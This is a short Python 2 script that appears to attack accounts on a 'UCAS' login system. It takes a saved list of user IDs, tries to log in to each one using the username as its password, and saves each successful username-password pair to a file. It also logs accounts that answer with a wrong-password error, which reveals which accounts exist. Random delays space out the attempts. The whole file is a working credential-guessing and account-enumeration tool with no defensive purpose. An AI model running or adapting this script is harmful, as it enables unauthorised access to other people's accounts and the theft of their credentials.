#!/usr/bin/env python
# coding=utf-8
import numpy as np
from UCAS import UCAS
from login import LogIn
from logout import logout
import time
class Run(UCAS):
    def __init__(self,pwd='ucas',num=300):
        self.pwd=pwd
#       self.num=num
        f = open('./ucasID.txt', 'r')
        GottenID = f.readlines()
        f.close()
        GottenID = [i.split('\n')[0].split('\t') for i in GottenID]
        self.ID = {}
        for i in GottenID:
            self.ID[i[0]] = i[1]
        userID=np.load('./data/ALLid.npy')
        self.ID_copy=list(userID.copy())
        self.userID=userID[:num]
        print len(userID)
    def run(self):
        flogin=LogIn()
    ##########################################################################
        for username in self.userID:
            time.sleep(0.1*np.random.rand())
            #       print username
            self.ID_copy.remove(username)
            if username in self.ID.keys():
                continue
#           log = flogin.run(username=username, pwd=self.pwd)
            self.pwd=username
            log = flogin.run(username=username, pwd=self.pwd)
            if log == 'success':
                f=open('./ucasID.txt','a')
                f.writelines(username + '\t' + self.pwd + '\n')
                f.close()
                logout()
                print username
            if log == 'errorPW' and self.WriteValidAccounts:
                f=open('./Valid_accounts.txt','a')
                f.writelines(username + '\n')
                f.close()
                print username

        np.save('./data/ALLid.npy',np.array(self.ID_copy))

if __name__=='__main__':
    f=Run(pwd='ucas',num=10)
    f.run()
